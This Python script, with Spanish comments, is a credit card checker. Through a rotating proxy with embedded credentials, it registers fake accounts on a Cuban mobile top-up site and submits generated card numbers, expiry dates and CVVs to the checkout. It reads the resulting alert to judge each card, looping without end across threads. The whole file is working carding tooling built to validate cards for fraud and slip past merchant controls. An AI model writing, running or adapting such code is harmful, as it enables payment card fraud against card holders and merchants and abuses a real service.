import names
import random
import time
import os
from concurrent.futures import ThreadPoolExecutor
from playwright.sync_api import sync_playwright
from rich.console import Console
from gen_cc import gen
from apps.colores import *

console = Console()

# Función para limpiar la consola
def limpiar_consola():
    os.system("cls" if os.name == "nt" else "clear")

# Función principal
def chk(ccn, mm, yyyy, cvc):
    # FAKE DATA ###############
    nombre = names.get_first_name()
    apellido = names.get_last_name()
    email = f"{nombre.lower()}.{apellido.lower()}{random.randint(1, 999)}@gmail.com"
    try:
        with sync_playwright() as p:
            # Configurar proxy para Playwright
            proxy_config = {
                "server": "http://p.webshare.io:80",  # Servidor del proxy
                "username": "anjkonrm-rotate",  # Usuario generado por Webshare
                "password": "7nkmkpcv3seo"
            }
            console.clear()
            limpiar_consola()
            browser = p.chromium.launch(headless=True)
            context = browser.new_context(proxy=proxy_config)
            context.tracing.start(screenshots=True, snapshots=True)
            page = context.new_page()

            print(azul, "Navegando a la pagina de registro...")
            # Navegar a la página de registro
            page.goto('https://hablacuba.com/account/register')

            # Espera a que la página cargue
            page.wait_for_load_state("load")
            print(azul, "Rellenando formulario...")
            # Rellenar los campos del formulario con .fill() en lugar de press_sequentially
            page.locator("input[placeholder='Nombre']").fill(nombre)
            page.locator("input[placeholder='Apellido']").fill(apellido)
            page.locator("input[placeholder='Correo Electrónico'][name='login']").fill(email)
            page.locator("input[placeholder='Contraseña'][name='password'][autocomplete='new-password']").fill(
                '&802r4rL')
            page.locator("input[placeholder='Confirmar contraseña'][name='confirm_password']").fill('&802r4rL')

            # Selecciona la casilla de verificación directamente por su ID y márcala
            page.locator("input#i_terms_and_conditions").click(force=True)

            # Haz clic en el botón "Únete"
            page.locator("button[class='btn btn-secondary w-100']").nth(0).click()
            print(azul, "Navegando a Home...")
            # Espera a que la página se cargue después del clic
            page.wait_for_load_state("load")
            page.wait_for_url("https://hablacuba.com/account/home")

            # Navegar a la página de recarga
            page.locator("a:has-text('Recarga Ahora')").click()
            print(azul, "Rellenando formulario de recarga...")
            page.locator("img[alt='Cubacel Saldo Principal']").click()
            page.locator("button[aria-label='Operator: Cubacel Saldo Principal']").click()
            page.locator("#phone_phone").click()
            page.locator("#phone_phone").fill('54143977')

            # Seleccionar un monto y realizar recarga
            page.locator("div.top-part.bundle-top > span.fs-28.lh-1.mt-5:has-text('6000')").click()
            page.locator("#buy-button-mr").click()

            # Completar detalles de facturación
            print(azul, "Completando detalles de facturación...")
            page.locator("input[placeholder='Número telefónico']").fill('3052649636')
            page.locator("input[placeholder='Dirección']").fill('street 2')
            page.locator("input[placeholder='Ciudad']").fill('New York')
            page.locator("input[placeholder='Código Postal']").fill('10080')

            # Seleccionar opciones desplegables
            page.locator('select[name="bill\\[country\\]"]').select_option('US')
            page.locator('select[name="bill\\[state\\]"]').select_option('NY')

            # Completar detalles de la tarjeta
            print(azul, "Completando detalles de la tarjeta...")
            page.locator("input[placeholder='Número de tarjeta']").fill(ccn)
            page.locator("select[aria-label='expiry month']").select_option(mm)
            page.locator("select[aria-label='expiry year']").select_option(yyyy)
            page.locator("input[placeholder='CVV']").fill(cvc)

            # Realizar el pedido
            page.locator("#place_order_button").click()
            print(verde, "Pedido realizado, esperando mensaje de respuesta...")
            try:
                # Espera hasta que el div con el mensaje de alerta esté visible
                page.locator("div.alert.alert-warning[role='alert']").wait_for(state="visible")
            except:
                print(azul, page.url)

            print(azul, "Extrayendo mensaje...")
            # Extraer y mostrar el mensaje de alerta
            alert_message = page.locator("div.alert.alert-warning[role='alert']").text_content()
            print(verde, "Mensaje de alerta:", alert_message)

    except Exception as e:
        print(rojo, f"Error: {e}.")

    finally:
        context.close()
        browser.close()
        context.tracing.stop(path="trace.zip")
        time.sleep(10)

def start():
    while True:  # Bucle infinito
        ccn, mm, yyyy, cvc = gen().split("|")

        # Usamos ThreadPoolExecutor para lanzar múltiples hilos
        with ThreadPoolExecutor(max_workers=5) as executor:
            executor.submit(chk, ccn, mm, yyyy, cvc)

if __name__ == '__main__':
    start()
